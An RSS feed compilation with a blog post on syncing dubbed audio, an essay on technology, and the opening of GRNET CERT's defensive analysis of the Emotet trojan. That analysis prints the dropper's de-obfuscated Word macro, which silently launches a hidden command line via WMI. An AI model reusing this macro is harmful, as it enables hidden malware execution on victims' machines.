<!--kg-card-end: markdown--><h2 id="new-plan-choirless-to-the-rescue-">New Plan - Choirless to the Rescue!</h2><p>Re-winding back to 2020, some colleagues of mine in IBM had a fantastic idea for our Internal Call for Code competition. <a href="https://www.choirless.com/">Choirless</a> is an online web service that allows distanced choir and band members to record their performances separately and to have them automatically synchronised and merged into a fantastic performance video. The summary of Choirless is well worth a watch:</p><figure></figure><p>It struck me that the work Choirless does to synchronise all of the performers could potentially be the magic bullet for solving this, <a href="https://twitter.com/HammerToe">@HammerToe</a> had written some clever python that could take two audio streams and synchronise them and even had streamed a walkthrough of his code that I had managed to catch months ago by chance:</p><figure></figure><p>Anything that I could explain here about my process would just be a re-hashing of the above video, so I highly recommend that you check it out. But the key point is this: Whilst both the Japanese and Cantonese audio tracks will be different because of the language differences, there is still plenty of audio that should be (almost) <em><strong>identical. </strong></em>All of the music and sound effects should be the same across both versions, so that will give us exactly what we need to identify the correct starting points for the Cantonese dub.</p><h2 id="how-it-works">How it works</h2><figure><img src="https://jsutton.co.uk/content/images/2021/02/diagram.png" alt=""><figcaption>Diagram showing the synchronisation process&nbsp;</figcaption></figure><p>The process starts off with extracting the video &amp; audio from the Blu Ray and VCDs onto your computer, I used <a href="https://handbrake.fr/">handbrake</a> for this.</p><p>Then you process the HQ Video (Primary) and the first VCD Video (Secondary). The python script will use the onset strength to look for peaks in both audio streams, it will then do forward and back passes with different offsets to find the best match for where the onset strength matches up.</p><figure><img src="https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-01-31-at-11.05.59.png" alt="" srcset="https://jsutton.co.uk/content/images/size/w600/2021/02/Screenshot-2021-01-31-at-11.05.59.png 600w, https://jsutton.co.uk/content/images/size/w1000/2021/02/Screenshot-2021-01-31-at-11.05.59.png 1000w, https://jsutton.co.uk/content/images/size/w1600/2021/02/Screenshot-2021-01-31-at-11.05.59.png 1600w, https://jsutton.co.uk/content/images/2021/02/Screenshot-2021-01-31-at-11.05.59.png 2354w" sizes="(min-width: 720px) 720px"><figcaption>Two charts showing the onset strength peaks before and after synchronisation.</figcaption></figure><p>Now because the VCD was split in two, we need to work out at which point the audio "should" start, so that we can skip forward on the primary track to the right place to give us our best chance of finding the offset. This is basically the following formula:</p><!--kg-card-begin: markdown--><p><code>hq_offset = part_1_duration - part_1_offset</code></p>
<!--kg-card-end: markdown--><p>Once we've got that, we repeat the synchronisation process for the second half of the audio! Sometimes the difference is positive rather than negative, this means that there is sadly a gap in the middle, so we need to add a slight delay in the middle before carrying on, so keep that in mind when you're doing this yourself.</p><!--kg-card-begin: markdown--><p>At this point, we should have the following:</p>
<ul>
<li>HQ rip of the Blu Ray</li>
<li>LQ Rip Parts 1 and 2 of the VCD</li>
<li>The offset in milliseconds for both parts of the VCD audio.</li>
</ul>
<!--kg-card-end: markdown--><p>Now for the fun part, use <a href="http://sox.sourceforge.net/#:~:text=SoX%20is%20a%20cross%2Dplatform,audio%20files%20on%20most%20platforms.">sox</a> to join the audio streams together, if you need to add some "dead air" in the middle, then use you can also generate some empty audio with sox:</p><!--kg-card-begin: markdown--><p>Generate 510ms of blank audio:<br>
<code>sox -n -r 44100 -c 1 silence510ms.wav trim 0.0 0.510</code></p>
<p>Merge Audio Streams:<br>
<code>sox file1.wav file2.wav merged.wav</code></p>
<p>Add your merged audio into your existing HQ film:<br>
<code>ffmpeg -i high_quality_film.mp4 -i cantonese_merged.aac -map 0 -map 1:a -c copy high_quality_film_Cantonese.mp4</code></p>
<!--kg-card-end: markdown--><p>Tada! You should now see a new audio track on your film in the language of your choice for you to personally enjoy. Remember to only use this process on your own personal copies of the media and don't distribute them to anyone else as that could land you in hot water!</p><h2 id="the-code-">The Code.</h2><p>The code I've thrown together definitely isn't anything near production as I've just had to use it for the handful of disks I own, but you're more than welcome to use it for your own purposes. I've thrown it up on GitHub for you use here:</p><figure><a href="https://gist.github.com/jpwsutton/28883e65292d0bfb8effe8357712e701"><div><p>A very rough python script to synchronise dubbed audio from different videos.</p><p>A very rough python script to synchronise dubbed audio from different videos. - audio_dub_sync.py</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>Gist</span></p></div><p><img src="https://github.githubassets.com/images/modules/gists/gist-og-image.png"></p></a></figure>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://jsutton.co.uk/sync-dubs-with-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26063097</guid>
            <pubDate>Mon, 08 Feb 2021 11:13:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “Why” of Technology]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26062642">thread link</a>) | @mpereira
<br/>
February 8, 2021 | https://www.murilopereira.com/the-why-of-technology/ | <a href="https://web.archive.org/web/*/https://www.murilopereira.com/the-why-of-technology/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://www.murilopereira.com/man_on_a_bicycle.jpg"></figure><blockquote><p>I think one of the things that really separates us from the high primates
is that we’re tool builders. I read a study that measured the efficiency of
locomotion for various species on the planet. The condor used the least
energy to move a kilometer. Humans came in with a rather unimpressive
showing about a third of the way down the list. It was not too proud a
showing for the crown of creation. So, that didn’t look so good.</p><p>But then, somebody at Scientific American had the insight to test the
efficiency of locomotion for a man on a bicycle. And, a man on a bicycle, a
human on a bicycle, blew the condor away, completely off the top of the
charts.</p><p>And that’s what a computer is to me. What a computer is to me is it’s the
most remarkable tool that we’ve ever come up with.</p><p>It’s the equivalent of a bicycle for our minds.</p><p>— <a href="https://www.youtube.com/watch?v=0lvMgMrNDlg&amp;feature=youtu.be&amp;t=322">Steve Jobs (1980)</a></p></blockquote><p>* * *</p><p><a href="https://www.it-hiroshima.ac.jp/institution/library/pdf/research52%5F007-013.pdf">No one knows</a> when or how we, the human species, started talking to each
other. It is likely a natural progression from gesturing, but we can only
speculate about it.</p><p>Language allowed us to break out of our brains and reveal the inner
workings of our consciousness to others.</p><figure><img src="https://www.murilopereira.com/language_speech.jpg" alt="Figure 2: Scott H. Young"><figcaption><p>Figure 2: <a href="https://www.scotthyoung.com/blog/2018/12/04/25-thinking-tools/">Scott H. Young</a></p></figcaption></figure><p>Language is the vessel that carried us from the stone age through the
agricultural revolution, the development of written language, the
scientific and industrial revolutions, and now, the digital age.</p><p>Writing allowed us to <em>offload</em> memories to the physical world—outside of
our brains. Through our collective and external memories, each generation
has a head start on the previous one. Little by little, standing on the
shoulders of taller and taller giants, we accumulate knowledge about
ourselves and everything around us.</p><p>We’ve been for long using tools to help us think: notebooks help us
calculate formulas, reason geometrically and preserve our ideas. With
computers, our <em>thinking</em> is now occurring outside of our brains.</p><p>Computers are extensions of our minds in that they allow us to store,
process, and retrieve information from them. With the advent of the
internet we now have immediate access to not only almost all of the
information ever produced by humankind but also to reproducible <em>thinking</em>
encoded into these machines: algorithms.</p><p>Our brain is still a much more impressive device than any of today's
computers. Computers learn
<a href="https://www.davidsilver.uk/wp-content/uploads/2020/03/nfsp-1.pdf">mostly</a>
by finding patterns in massive
quantities of examples given by us. Teaching a young kid about cars—how
to recognize one, what they are, what their purpose is, and how they're
related to other things—requires little supervision. Noam Chomsky talks
about it in
<a href="https://www.youtube.com/watch?v=hdUbIlwHRkY&amp;t=1462">this interview</a>.</p><p>Each of these processes—storing, processing and retrieving
information—have concrete effects on the physical world: if I’m in
Munich, saying “show route to Hamburg” to my phone will immediately show me
the distance, ETAs and paths for different types of transport to reach my
destination. Not only do I now suddenly know how to navigate across the
country to reach another city, I’m also able to follow through the exact
path via GPS—a sixth sense giving me perfect geolocation!</p><p>These <em>things</em> that we created—computers, and the internet—are literally
<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6502424/">rewiring our brains</a>, right now, shaping how we think, and engage in social
relationships, changing not only our individual selves but the societies we
live in.</p><p>They started as mechanical machines that filled entire laboratories, turned
into beige boxes in our homes and places of work, and are now sleek slabs
of plastic, metal and glass in everyone’s pockets. Step by step they get
closer to our bodies, their interfaces more intuitive and natural.</p><p>The way we communicate with them is changing: before, we could only
interact with them by speaking their language. We have now taught them
ours. The torch of progress blazes on: it’s a matter of <em>time</em> until they’re
connected directly with our brains—which is equally terrifying and
awe-inspiring.</p><figure><img src="https://www.murilopereira.com/neuralink.jpg" alt="Figure 3: Neuralink"><figcaption><p>Figure 3: <a href="https://neuralink.com/">Neuralink</a></p></figcaption></figure><p>Brain-computer interfaces present a monumental scientific and engineering
challenge, and brain-to-brain, a whole other category of difficulty.</p><p>First, we have no idea how information is encoded in the brain. That needs
to be understood. Second, even assuming we’re able to take a perfect
snapshot of a piece of information in someone’s brain—for example, how a
particular movie scene makes them feel—we still need to be able to encode
it in a way that includes the full context of their subjective experiences.
Maybe the scene evokes unique memories of their childhood or is somehow
entangled with the smell of a particular cinema’s leather seats. Third, we
need to figure out how to safely write this perfect snapshot into someone
else’s brain in a way that can be perceived identically.</p><p>Which is to say, it’s a difficult problem. But a worthwhile one: imagine
having the capability to suddenly become aware of answers for questions you
just thought about. To expertly control <a href="https://youtu.be/PLk8Pm%5FXBJE?t=13">truly integrated</a> prosthetics giving
you superhuman abilities. To give movement to the paralized, sound to the
deaf, and sight to the blind.</p><p>What would be the impacts on society if we were able to communicate an
order of magnitude more effectively? What if <em>everyone</em> was equipped with
the same undisputed basic knowledge of history and science?</p><p>There are internal thoughts that we can attempt to describe with a thousand
words, but ultimately fail to capture in a way that’s precise, much less
comprehensible by someone else. Words and sentences are an incomplete
representation of our internal thoughts. In the same way that 3D objects
cast 2D shadows (<a href="https://www.youtube.com/watch?v=N0WjV6MmCyM">and 4D, 3D</a>) communicating through language doesn’t carry
all of our cultural and developmental context—transmitting all of that
along with every phrase would be impractical. Language is in this sense,
lossily compressed thought.</p><figure><img src="https://www.murilopereira.com/tesseract_shadow.jpg"></figure><p>Inert strings of words of ink and paper take a life of their own inside our
heads. It’s why the exact same information can be interpreted completely
differently by different people.</p><p>Before language, fire and cooking technology allowed us to reallocate
energy usage from the digestive system to the brain by outsourcing
digestion to outside of our bodies, making macronutrients more efficiently
absorbable. Almost all of a cooked meal is metabolized by the body, whereas
raw foods yield less than half of their nutrients.</p><p>Cooking is an extension of our digestive system, and enabled us to develop
large, calorie-hungry brains. It also gave us time to think: our primate
cousins spend half of their days chewing raw food to consume enough
calories to stay alive.</p><p>Brains can be seen as <em>survival machines</em>, locked inside dark skulls,
constantly building a model of the outside world by predicting and learning
through senses and memory. The biological human brain evolved to have the
necessary sophistication to not only expertly navigate and understand the
brute physical reality but also to construct <em>social</em> reality. Democracy,
religion, money: all made up by us, for us.</p><p>We remember the past so that we can predict the future, and by doing so, we
thrive.</p><p>We create technology, which functions as a non-biological extra layer to
our brains and bodies, augmenting, complementing, and sometimes replacing
our natural capabilities.</p><blockquote><p>The wheel… is an extension of the foot.</p><p>The book… is an extension of the eye…</p><p>Clothing, an extension of the skin…</p><p>Electric circuitry, an extension of the central nervous system.</p><p>—
<a href="https://en.wikipedia.org/wiki/Understanding_Media">Understanding Media: The Extensions of Man (1964)</a></p></blockquote><p>Relatively speaking, we are done evolving <em>biologically</em>. Further adaptations
and enhancements to our bodies and minds will come through technology.</p><figure><img src="https://www.murilopereira.com/brain_layers.jpg" alt="Figure 5: Check out &amp;ldquo;Neuralink and the Brain&amp;rsquo;s Magical Future&amp;rdquo; for a very entertaining primer on the brain."><figcaption><p>Figure 5: Check out “<a href="https://waitbutwhy.com/2017/04/neuralink.html">Neuralink and the Brain’s Magical Future</a>” for a very entertaining primer on the brain.</p></figcaption></figure><p>To be human is to have the ability to change the world around us. The shift
from hunting and gathering to farming allowed us to spend less energy to
acquire food while giving us a predictable calorie supply.</p><p>The resulting food surplus made it possible for populations to settle down
and grow quickly while supporting people not being directly involved in the
production of food—before agriculture that was everyone’s job. For one,
it allowed some to specialize and focus on developing better farming tools
and more resistant crops, starting a vicious cycle of improvement and
consumption that continues until today.</p><p>The transition from active foraging to a more sedentary lifestyle resulted
in worse health for the general population. The average farmer worked
harder than the average forager and got a worse diet in return. Our teeth,
bones and joints became more fragile, and we became afflicted by novel
diseases coming from newly domesticated animals, carriers of pathogens that
incubated in our new densely populated cities.</p><p>Owning land suddenly became really important. Agriculture and the concept
of private property reinforced each other and grew together, allowing us to
create value and secure the fruits of our labor. It also created the
circumstances for slavery to arise, and wars to be waged.</p><p>The groups of people growing the first crops could not have anticipated all
of the collateral effects of their breakthrough. They just wanted more
food.</p><p>If the past has taught us anything is that we have to be mindful of the
consequences of our progress. In an increasingly connected world, change is
often <a href="https://hbr.org/2017/05/linear-thinking-in-a-nonlinear-world">nonlinear</a> and unpredictable. Cars didn’t just replace horses—they
forever changed the entire outlook of every city. Did Tim Berners-Lee
anticipate his invention adding to forces pulling whole countries apart?</p><p>Our progress will continue to bring us previously unimaginable challenges.
Against an unknowable future, it doesn’t hurt to keep improving our
capabilities to adapt and, more difficultly, to cooperate—especially at
scale.</p><figure><img src="https://www.murilopereira.com/humanity.jpg" alt="Figure 6: &amp;ldquo;Humanity&amp;rdquo; by Pawel Kuczynski"><figcaption><p>Figure 6: “<a href="https://www.pictorem.com/24592/humanity.html">Humanity</a>” by Pawel Kuczynski</p></figcaption></figure><p>Computers are getting pretty good at driving cars—even in the most
difficult situations—and can already instantly diagnose some diseases
better than human doctors. Technology has a way to <a href="https://www.thenewatlantis.com/publications/understanding-heidegger-on-technology">reveal</a> the potential of
our environment, and ourselves. We have to be careful not to look at …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.murilopereira.com/the-why-of-technology/">https://www.murilopereira.com/the-why-of-technology/</a></em></p>]]>
            </description>
            <link>https://www.murilopereira.com/the-why-of-technology/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26062642</guid>
            <pubDate>Mon, 08 Feb 2021 10:03:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A full reverse engineering analysis of the emotet trojan]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26062586">thread link</a>) | @ttouch
<br/>
February 8, 2021 | https://cert.grnet.gr/en/blog/reverse-engineering-emotet/ | <a href="https://web.archive.org/web/*/https://cert.grnet.gr/en/blog/reverse-engineering-emotet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
			<div id="post-area">
<article id="post-599">

	<div>

		<div>
			
						
			
			<div>
				
				<p><span><img width="1867" height="1003" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-trojan-c2-network-map.png" alt="" loading="lazy" title="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-trojan-c2-network-map.png 1867w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-trojan-c2-network-map-300x161.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-trojan-c2-network-map-1024x550.png 1024w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-trojan-c2-network-map-768x413.png 768w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-trojan-c2-network-map-1536x825.png 1536w" sizes="(max-width: 1867px) 100vw, 1867px"></span></p>




<h2><span id="Preamble"></span>Preamble<span></span></h2>



<p>In October 2020 we observed an outbreak of malicious e-mails reaching GRNET employees’ inboxes. Meanwhile, similar campaigns were also targeting several public and private sector organizations in Greece. After acquiring dozens of such e-mails, we started planning our defensive strategy. To do so, we started analyzing the malware that was attached to the emails and realized that were dealing with the infamous Emotet trojan.</p>



<p>In this document, we describe the steps of our analysis including the reverse engineering process of the malware executables, how we overcame the binary obfuscation techniques it employed, and how we determined the malware’s internals. In the course of our work, we were able to discover the list of IP addresses that&nbsp;constituted the network of Command-and-Control (C2) servers of Emotet. This information was very useful because we utilized it to detect any network connections from the GRNET network to the Emotet C2 network. Such connections&nbsp; would indicate a potential compromised workstation in our premises. Overall, the goals of our analysis were to (a) create an infrastructure that received new updates of the Emotet trojan and keep our list of C2 IP addresses up-to-date and (b) understand the trojan’s persistence mechanism to perform forensic invastigations on compromised workstations.</p>



<p>On January 27, 2021 <a rel="noreferrer noopener" href="https://www.europol.europa.eu/newsroom/news/world%E2%80%99s-most-dangerous-malware-emotet-disrupted-through-global-action" target="_blank">Europol announced</a> that it had completely taken down Emotet. The same day our update-monitoring infrastructure received an update which was Europol’s clean-up payload scheduled to be executed on April 25, 2021 at 12:00 p.m.. Hopefully, this will be the last time that we hear about Emotet. Meanwhile, we had been working on analyzing Emotet up to the time of Europol’s announcement. We release our analysis results hoping that IT professionals will find them useful when trying to protect against similar trojans in the future.</p>



<p>In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_1_From_the_e-mails_to_the_binaries" data-type="post">Chapter 1</a> we describe the malicious e-mails and the malware dropper (a macro-enabled MS Word document) delivered via those e-mails.&nbsp;If you are already familiar with Emotet’s dropper you may directly skip to the next chapters. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_2_From_the_Protector_to_the_Trojan">Chapter 2</a> we analyze the malware’s multi-layer Protector responsible for unpacking, decrypting and running the trojan for the first time. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_3_Overcoming_the_malware_obfuscation_techniques">Chapter 3</a> we describe the binary obfuscation techniques incorporated in the trojan itself as well as the ways to bypass them. In <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_4_The_trojans_internals">Chapter 4</a> we provide an in-depth description of the trojan’s inner-workings, its persistence mechanism, the communication with the Command-and-Control servers network and the way we discovered the C2 network. Finally, in <a href="https://cert.grnet.gr/en/blog/reverse-engineering-emotet/#Chapter_5_Monitoring_the_updates">Chapter 5</a> we briefly describe the process we followed to retrieve and analyze new payloads served by the C2 network.</p>



<p>We have published the de-compiled code of referenced functions as well as the utilities that we implemented during the analysis in <a href="https://github.com/grnet/emotet-utils" target="_blank" rel="noreferrer noopener">a GitHub repository</a>.</p>



<p>This work was carried out under the&nbsp;supervision of GRNET’s Chief Information Security Officer, Dimitris Mitropoulos.</p>



<p>Dimitris Kolotouros – Head of IT Security Department, GRNET<br>Marios Levogiannis – Senior IT Security Engineer, GRNET</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-overview-1.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="1024" height="349" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-overview-1-1024x349.png" alt="Emotet stages" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-overview-1-1024x349.png 1024w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-overview-1-300x102.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-overview-1-768x262.png 768w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-overview-1.png 1395w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Figure 0. Emotet stages overview</figcaption></figure></div>



<h2><span id="Chapter_1_From_the_e-mails_to_the_binaries"></span>Chapter 1. From the e-mails to the binaries<span></span></h2>



<h3><span id="Introduction"></span>Introduction<span></span></h3>



<p>October 2020.</p>



<p>Seven months have passed since the first COVID-19 lockdown in Greece. The pandemic finds GRNET with a largely broadened IT Security agenda heavily linked with the state’s current digital transformation (involving several new applications being developed and maintained in house). The aforementioned developments, together with the work-from-home style that has just arrived, completely redefined the security perimeter and priorities of GRNET CERT. A new era comes with new challenges.</p>



<p>Somewhere in between the various ongoing tasks, a number of weird looking e-mails that reached GRNET employees came to our notice. They all had a similar form, i.e., replies to legitimate mails that either contain a URL or an encrypted ZIP attachment and its password.</p>



<h3><span id="The_e-mails"></span>The e-mails<span></span></h3>



<p>First, to raise awareness, we notified all GRNET employees. Then, we started collecting and analyzing the suspicious e-mails. Initially, we inspected their source code looking for similarities.</p>



<figure><ul><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="685" height="750" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png" alt="E-mails delivering Emotet dropper via URL (left) and attachment (right)" data-id="850" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png" data-link="https://cert.grnet.gr/en/emotet-dropper-email-1/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1.png 685w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-1-274x300.png 274w" sizes="(max-width: 685px) 100vw, 685px"></a></figure></li><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="960" height="853" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png" alt="E-mails delivering Emotet dropper via URL (left) and attachment (right)" data-id="677" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png" data-link="https://cert.grnet.gr/en/emotet-dropper-email-2-2/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2.png 960w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2-300x267.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-email-2-768x682.png 768w" sizes="(max-width: 960px) 100vw, 960px"></a></figure></li></ul><figcaption>Figure 1. E-mails delivering Emotet dropper via URL (left) and attachment (right)</figcaption></figure>



<p>Our analysis led to several interesting remarks:</p>



<ul><li>All e-mails were replies to legitimate e-mails. The e-mail subject followed a specific pattern, i.e., “Re: &lt;ORIGINAL MAIL SUBJECT&gt;”. Also, the e-mail body contained the quoted original e-mail body.</li><li>The sender’s display name was altered to be the same with that of the original e-mail.</li><li>However, the sender’s e-mail address was some unrelated e-mail address (several compromised e-mail accounts were used).</li><li>The body of the reply contained either a URL or an attachment.<ul><li>In the case of the URL, the text contained a legitimate domain name (e.g. gmail.com). Nevertheless, the actual target was completely different. Our investigation indicated that they were compromised websites used by the attackers to host the malicious documents.</li><li>In the case of the attachment we observed encrypted ZIP files with the corresponding password contained in the reply body. Note that password encrypted attachments are commonly used to bypass any malware detection running on e-mail servers.</li></ul></li><li>Finally, in all cases we ended up with MS Word documents.</li></ul>



<h3><span id="The_MS_Word_documents"></span>The MS Word documents<span></span></h3>



<p>Up to this point, we had already been informed about similar cases affecting other public and private sector organizations in Greece. Thus, a conventional incident response was not enough; we wanted to further analyze the malware.</p>



<p>Our analysis started with the Word documents. When opening one of the documents, the victim sees a fake pop-up window. In fact, this is just an image inside the document imitating a legitimate pop-up window. In each document the fake pop-up window phrasing was different, but in every case it was there to persuade the victim to enable the Macro execution.</p>



<figure><ul><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="971" height="1024" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1-971x1024.png" alt="Fake MS Word pop-ups in Emotet dropper" data-id="678" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1.png" data-link="https://cert.grnet.gr/en/emotet-dropper-word-doc-1-2/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1-971x1024.png 971w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1-285x300.png 285w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1-768x810.png 768w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-1.png 1175w" sizes="(max-width: 971px) 100vw, 971px"></a></figure></li><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="971" height="1024" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2-971x1024.png" alt="Fake MS Word pop-ups in Emotet dropper" data-id="679" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2.png" data-link="https://cert.grnet.gr/en/emotet-dropper-word-doc-2-2/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2-971x1024.png 971w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2-285x300.png 285w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2-768x810.png 768w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-2.png 1175w" sizes="(max-width: 971px) 100vw, 971px"></a></figure></li><li><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="1024" height="1020" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-1024x1020.png" alt="Fake MS Word pop-ups in Emotet dropper" data-id="671" data-full-url="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3.png" data-link="https://cert.grnet.gr/en/emotet-dropper-word-doc-3/" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-1024x1020.png 1024w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-300x300.png 300w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-150x150.png 150w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-768x765.png 768w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-50x50.png 50w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-100x100.png 100w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3-70x70.png 70w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-word-doc-3.png 1280w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></li></ul><figcaption>Figure2. Fake MS Word pop-ups in Emotet dropper </figcaption></figure>



<p>We will continue by analyzing one of the MS Word documents. All other documents were similar to the one examined; albeit with minor differences.</p>



<h3><span id="The_VBScript_Macros"></span>The VBScript Macros<span></span></h3>



<p>To see what would happen when a user enabled the macros, we examined the corresponding VBScript. The entry-point <code>Document.Open()</code> called function <code>Q4hxwcihtett()</code> of module <code>Iauesnh6lzhaf</code>:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="395" height="163" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1.png 395w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-1-300x124.png 300w" sizes="(max-width: 395px) 100vw, 395px"></a><figcaption>Figure 3. The VBScript macro entry-point </figcaption></figure></div>



<p>The function code, as we observe below, was obfuscated:</p>



<div><figure><a href="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited.png" rel="prettyPhoto[gallery-mHtF]"><img loading="lazy" width="735" height="413" src="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1.png" alt="" srcset="https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1.png 735w, https://cert.grnet.gr/wp-content/uploads/2021/02/emotet-dropper-vbscript-2-edited-1-300x169.png 300w" sizes="(max-width: 735px) 100vw, 735px"></a><figcaption>Figure 4. The main VBSript macro module</figcaption></figure></div>



<p>We started following the code flow manually to understand it. This manual process revealed that most of the code was indeed irrelevant. Specifically, for each meaningful code instruction, the obfuscation process had generated a bunch of meaningless instructions placed before the meaningful one. So, most of the de-obfuscation effort was to identify each block and isolate the meaningful code instruction out of the block.</p>



<p>Luckily enough, the attackers had left some traces that were helpful for us. As we noticed, their obfuscating tool had a serious issue (nobody’s perfect). In particular, it did not apply the indentation of the original instruction on the instructions of the replacement block. As a result, the original indentation could be found on the first instruction of each block. This&nbsp;issue gave us a way to automatically detect the blocks and isolate the last instruction of each block, which we knew it was the meaningful instruction of the block.</p>



<p>The following obfuscation techniques were identified:</p>



<ul><li>Deliberate run-time errors in junk instructions (which were ignored because of the <code>On Error Resume Next</code> statement),</li><li>String construction using one or more of the following:<ul><li>String concatenation,</li><li>Use of undefined variables that resolve to empty strings,</li><li>String replacements with the <code>Replace()</code> function,</li><li>Conversion of ASCII codes to strings with the <code>ChrW()</code> function,</li><li>Retrieval of values from hidden user form control elements,</li></ul></li><li>Alteration between upper and lower case letters in symbol names, exploiting the case insensitivity of Windows OS,</li><li>Use of the line-continuation character <code>_</code> to break statements in multiple lines.</li></ul>



<p>Then, we only had to manually de-obfuscate some lines of code (the original number of lines was a little more than 400). The result was the following:</p>



<pre><code>01: Rem Attribute VBA_ModuleType=VBADocumentModule
02: Option VBASupport 1
03: Private Sub Document_open()
04:   Set storyRange = ThisDocument.StoryRanges.Item(1)
05:   Set commandLine = Mid(storyRange, 5, Len(storyRange))
06:   commandLine = Replace(commandLine, "][ 1) jjkgS [] []w", Empty)
07:   Set objProcess = CreateObject("winmgmts:Win32_Process")
08:   Set objProcessStartup = CreateObject("winmgmts:Win32_ProcessStartup")
09:   objProcessStartup.ShowWindow = 0
10:   objProcess.Create commandLine, Empty, objProcessStartup
11: End Sub</code></pre>



<p>Hence, we were able to answer an important question: “What happens when the user executes this macro?”</p>



